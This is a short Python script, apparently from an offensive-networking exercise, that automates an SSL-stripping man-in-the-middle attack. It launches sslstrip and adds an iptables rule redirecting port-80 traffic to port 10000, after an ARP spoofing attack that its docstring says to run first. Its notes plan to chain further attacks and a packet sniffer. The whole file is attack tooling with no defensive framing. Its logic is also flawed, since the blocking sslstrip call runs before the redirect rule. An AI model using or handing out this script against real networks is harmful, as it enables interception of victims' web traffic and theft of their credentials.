'''
First run an arp spoofing attack
Note:
    1) sslstrip only looks at packet that pass thru port 10000
IMPROVEMENTS NEEDED:
    1) Add paramaters
        Take in a file name that runs an attack, execute that attack after sslstrip is set up
'''
import subprocess

try:
    print("[+] Starting sslstrip")
    subprocess.call(["sslstrip"])
    #redirecting packets from port 80 (web servers) to port 10000
    subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"])
    #subprocess.call(["packet_sniffer.py"])
except KeyboardInterrupt:
    print("[-] Ending sslstrip")
    subprocess.call(["iptables", "--flush"])